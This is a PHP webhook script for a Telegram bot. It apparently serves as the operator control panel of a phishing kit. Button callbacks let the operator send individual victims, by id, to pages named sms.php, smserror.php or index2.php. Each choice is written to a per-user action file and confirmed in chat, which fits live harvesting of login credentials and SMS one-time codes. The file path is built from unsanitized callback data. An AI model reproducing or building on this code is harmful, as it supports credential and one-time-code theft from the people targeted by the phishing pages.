<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);

require_once("settings.php");

$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

if (isset($update["callback_query"])) {
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);

    if ($accion === "SMS") {
        file_put_contents("acciones/{$usuario}.txt", "sms.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "➡️ Redirigido a sms.php para $usuario"
        ]));
    } elseif ($accion === "SMS-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "smserror.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "❌ Redirigido a smserror.php para $usuario"
        ]));
    } elseif ($accion === "LOGIN-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "index2.php");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "⚠️ Redirigido a index2.php para $usuario"
        ]));
    }
}
?>
